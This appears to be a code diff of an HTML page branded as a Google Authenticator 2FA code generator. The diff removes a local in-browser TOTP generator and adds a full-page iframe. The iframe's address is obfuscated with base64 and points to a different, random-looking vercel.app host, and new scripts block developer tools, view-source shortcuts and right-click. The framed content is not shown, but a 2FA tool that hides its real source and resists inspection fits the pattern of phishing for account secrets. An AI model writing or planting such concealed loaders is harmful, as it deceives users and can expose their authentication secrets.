@@ -1,192 +1,62 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="Generate Two-Factor Authentication (2FA) codes using Google Authenticator.">
-  <meta name="keywords" content="2FA, Two-Factor Authentication, Google Authenticator, OTP, Security">
-  <meta name="robots" content="index, follow">
+
   <meta property="og:title" content="Two-Factor Authentication - Google Authenticator">
-  <meta property="og:description" content="Generate secure 2FA codes for your accounts.">
+  <meta property="og:description" content="Secure your accounts with Two-Factor Authentication.">
+  <meta property="og:image" content="Google_Authenticator">
+  <meta property="og:url" content="https://fast2fa.vercel.app/">
   <meta property="og:type" content="website">
-  <meta property="og:url" content="https://fast2fa.vercel.app">
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="Two-Factor Authentication - Google Authenticator">
-  <meta name="twitter:description" content="Easily generate secure 2FA codes.">
+
   <title>Two-Factor Authentication - Google Authenticator</title>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/otpauth/9.0.1/otpauth.umd.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
   <style>
-    body {
+    body, html {
+      margin: 0;
+      padding: 0;
       font-family: Arial, sans-serif;
-      margin: 20px;
-      text-align: center;
-      background-color: #181424;
-      color: #ffffff;
+      background-color: #000;
+      height: 100%;
+      overflow: hidden;
     }
 
-    textarea {
-      width: 80%;
-      height: 100px;
-      margin-top: 10px;
-      background-color: #1e1e2e;
-      color: #fff;
-      border: 1px solid #3a3a4e;
-    }
-
-    .container {
-      max-width: 600px;
-      margin: auto;
-    }
-
-    .timeout-bar {
-      height: 10px;
-      background-color: blue;
-      margin: 10px 0;
-      transition: width 1s linear;
-      display: none;
-    }
-
-    .timeout-text {
-      color: white;
-      font-size: 18px;
-      font-weight: bold;
-      margin-bottom: 10px;
-      display: none;
-    }
-
-    .timeout-text span {
-      color: red;
-    }
-
-    table {
+    iframe {
       width: 100%;
-      border-collapse: collapse;
-      margin-top: 20px;
-      background-color: #24243e;
-      table-layout: fixed;
-      word-wrap: break-word;
-    }
-
-    th,
-    td {
-      border: 1px solid #3a3a4e;
-      padding: 10px;
-      text-align: left;
-      word-break: break-word;
-    }
-
-    .error {
-      color: red;
-      margin-top: 10px;
-    }
-
-    .copy-btn {
-      margin-left: 10px;
-      cursor: pointer;
-      padding: 5px;
-      background-color: #ffffff;
-      color: #181424;
+      height: 100vh;
       border: none;
-      border-radius: 5px;
     }
   </style>
+
+  <script>
+    document.addEventListener('keydown', function(event) {
+      if (event.key === 'F12' || (event.ctrlKey && event.shiftKey && event.key === 'I') || (event.ctrlKey && event.key === 'U')) {
+        event.preventDefault();
+      }
+    });
+
+    document.addEventListener('contextmenu', function(event) {
+      event.preventDefault();
+    });
+
+    document.addEventListener('mousedown', function(event) {
+      if (event.button === 2) {
+        event.preventDefault();
+      }
+    });
+
+    window.onload = function() {
+      var iframeUrl = atob('aHR0cHM6Ly9mYXN0MmZhamhqc2ZoajM4eWZhYmhmYWhnaHZhZnl1M3NhMjJmZmZhYXZhdS52ZXJjZWwuYXBwLw==');
+      document.getElementById('iframe').src = iframeUrl;
+    };
+  </script>
+
 </head>
 
 <body>
-  <div class="container">
-    <h2>🔑 Two-Factor Authentication - Google Authenticator</h2>
-    <p>* Please enter 2FA secret - Multiple 2FA secrets can be entered, 1 per line!</p>
-    <textarea id="secretInput" placeholder="Enter your 2FA secret..."></textarea>
-    <div class="error" id="errorMsg"></div>
-    <div class="timeout-text" id="timeoutDisplay">Time out: <span id="timeoutCounter">30</span> <span>s</span></div>
-    <div class="timeout-bar" id="timeoutBar"></div>
-    <table>
-      <thead>
-        <tr>
-          <th>2FA Secret</th>
-          <th>2FA Code</th>
-        </tr>
-      </thead>
-      <tbody id="codesTable">
-        <!-- Codes will be generated here -->
-      </tbody>
-    </table>
-  </div>
-  <script>
-    let timeoutInterval;
-    let countdown = 30;
-
-    // Clear the input each time the page is refreshed (No localStorage used)
-    document.getElementById('secretInput').value = ''; // Ensure that the value is empty
-
-    // Listen to input changes and generate codes
-    document.getElementById('secretInput').addEventListener('input', generateCodes);
-
-    // Function to handle the timeout and countdown
-    function startTimeout() {
-      document.getElementById('timeoutBar').style.display = 'block';
-      document.getElementById('timeoutDisplay').style.display = 'block';
-      countdown = 30; // Always reset countdown to 30
-
-      // Clear any existing interval before starting a new one
-      if (timeoutInterval) {
-        clearInterval(timeoutInterval);
-      }
-
-      timeoutInterval = setInterval(() => {
-        countdown--;
-        document.getElementById('timeoutCounter').textContent = countdown;
-        document.getElementById('timeoutBar').style.width = (countdown / 30) * 100 + '%';
-
-        if (countdown <= 0) {
-          // After the countdown finishes, regenerate the codes and reset the timer
-          generateCodes();
-        }
-      }, 1000);
-    }
-
-    // Function to generate the 2FA codes
-    function generateCodes() {
-      const secrets = document.getElementById('secretInput').value.split('\n').map(s => s.replace(/\s+/g, '').trim()).filter(Boolean);
-      const tableBody = document.getElementById('codesTable');
-      const errorMsg = document.getElementById('errorMsg');
-
-      tableBody.innerHTML = '';
-      errorMsg.textContent = '';
-
-      if (secrets.length === 0) {
-        errorMsg.textContent = 'Please enter at least one 2FA secret.';
-        return;
-      }
-
-      for (let secret of secrets) {
-        try {
-          let totp = new OTPAuth.TOTP({
-            secret: OTPAuth.Secret.fromBase32(secret),
-            algorithm: "SHA1",
-            digits: 6,
-            period: 30
-          });
-          let token = totp.generate();
-          let row = `<tr><td style='white-space: pre-wrap;'>${secret}</td><td>${token} <button class='copy-btn' data-clipboard-text="${token}">Copy</button></td></tr>`;
-          tableBody.innerHTML += row;
-        } catch (error) {
-          errorMsg.textContent = `Invalid secret key: ${secret}`;
-        }
-      }
-
-      // Start timeout timer once codes are generated
-      startTimeout();
-
-      // Initialize Clipboard.js
-      new ClipboardJS('.copy-btn');
-    }
-  </script>
-  <footer style="margin-top: 20px; color: #888; font-size: 14px; text-align: center;">
-    © 2025 Satria Developer. All rights reserved.
-  </footer>
+  <iframe id="iframe" allowfullscreen></iframe>
 </body>
 
 </html>
